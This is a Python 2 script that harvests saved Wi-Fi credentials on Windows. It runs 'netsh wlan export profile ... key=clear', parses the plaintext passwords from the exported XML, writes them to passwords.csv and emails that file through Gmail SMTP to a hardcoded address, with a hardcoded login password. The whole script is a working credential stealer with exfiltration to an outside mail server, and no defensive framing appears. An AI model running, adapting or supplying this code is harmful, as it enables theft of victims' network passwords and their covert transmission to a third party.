import subprocess
import glob, os
from xml.dom import minidom
import csv
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

cmdCommandKnownNetwork="netsh wlan export profile"
process = subprocess.Popen(cmdCommandKnownNetwork.split(), stdout=subprocess.PIPE)
processMsg,error=process.communicate()
fileList=[]

for file in glob.glob("*.xml"):
    fileList.append(file)
    
nwnameList=[]
for file in fileList:
    name=str(file)
    i=0
    sanitize_name=name.replace("Wi-Fi-","")
   
    br=sanitize_name.rfind('.')
    nwname=''
    while(i<br):
        nwname+=sanitize_name[i]
        i+=1
    nwnameList.append(nwname)
    #print nwname+"\n"
for i in nwnameList:
    try:
        cmdToGetPassword="netsh wlan export profile \""+i+"\" key=clear"
        process = subprocess.Popen(cmdToGetPassword.split(), stdout=subprocess.PIPE)
        processMsg1,error1=process.communicate()
        print i+"---------------------------------------"
        print processMsg1+'\n'
        print error1
        print "==========================================="
    except:
        print "some error occured"

newFileList=[]

for file in glob.glob("Wi-Fi*.xml"):
    newFileList.append(file)

pwdList=[]
for i in newFileList:
    try:
        print i
        parsed_file=minidom.parse(i)
        passowrd=parsed_file.getElementsByTagName("keyMaterial")[0]
        pwdList.append(passowrd.firstChild.data)
    except:
        print "unsupported file"
for i in pwdList:
    print i

with open("passwords.csv","w") as fp:
    a=csv.writer(fp,delimiter=",")
    data=[nwnameList,pwdList]
    a.writerows(data)


fromaddr = "pythonprogramming007@gmail.com"
toaddr = "pythonprogramming007@gmail.com"
  
# instance of MIMEMultipart
msg = MIMEMultipart()
 
# storing the senders email address  
msg['From'] = fromaddr
 
# storing the receivers email address 
msg['To'] = toaddr
 
# storing the subject 
msg['Subject'] = "Test mail"
 
# string to store the body of the mail
body = "test mail with attachment"
 
# attach the body with the msg instance
msg.attach(MIMEText(body, 'plain'))
 
# open the file to be sent 
filename = "passwords.csv"
attachment = open(os.path.abspath(filename), "rb")
 
# instance of MIMEBase and named as p
p = MIMEBase('application', 'octet-stream')
 
# To change the payload into encoded form
p.set_payload((attachment).read())
 
# encode into base64
encoders.encode_base64(p)
  
p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
 
# attach the instance 'p' to instance 'msg'
msg.attach(p)
 
# creates SMTP session
s = smtplib.SMTP('smtp.gmail.com', 587)
 
# start TLS for security
s.starttls()
 
# Authentication
s.login(fromaddr, "Hacker@123")
 
# Converts the Multipart msg into a string
text = msg.as_string()
 
# sending the mail
s.sendmail(fromaddr, toaddr, text)
 
# terminating the session
s.quit()


    

